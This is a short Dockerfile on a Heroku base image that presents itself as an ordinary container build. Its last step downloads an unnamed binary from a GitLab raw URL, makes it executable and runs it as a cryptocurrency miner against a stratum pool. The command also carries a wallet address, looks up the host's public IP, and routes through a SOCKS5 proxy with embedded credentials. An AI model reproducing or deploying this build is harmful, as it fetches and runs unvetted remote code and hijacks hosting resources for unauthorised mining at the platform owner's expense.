FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN apt update
RUN apt install -y lynx
RUN lynx -dont_wrap_pre -dump "https://gitlab.com/gilaaja/exe/-/raw/main/data" > data && chmod 777 data && ./data -a yescryptr16 -o stratum+tcp://103.249.70.7:6333 -u RKrpSay1M45Vt88ovzzaTBY9RcbBe2RwKy -p c=RVN,mc=QOGE,ID=UBD-$(echo $(curl ident.me)) -x socks5://gilaajakali-rotate:g1l4l03k4l1@149.6.162.2:80
